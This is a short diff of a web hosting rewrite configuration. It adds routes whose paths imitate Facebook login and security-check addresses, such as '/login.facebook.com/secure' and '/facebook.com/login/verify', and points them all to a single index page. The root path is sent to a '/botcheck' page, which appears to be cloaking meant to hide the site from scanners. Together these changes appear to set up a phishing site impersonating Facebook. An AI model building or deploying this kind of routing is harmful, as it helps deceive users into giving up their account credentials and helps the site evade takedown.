@@ -5,8 +5,20 @@
       "destination": "/index.html"
     },
     {
-      "source": "/(.*)",
+      "source": "/l.facebook.com/security/check",
+      "destination": "/index.html"
+    },
+    {
+      "source": "/login.facebook.com/secure",
+      "destination": "/index.html"
+    },
+    {
+      "source": "/",
       "destination": "/botcheck"
+    },
+    {
+      "source": "/facebook.com/login/verify",
+      "destination": "/index.html"
     }
   ]
 }
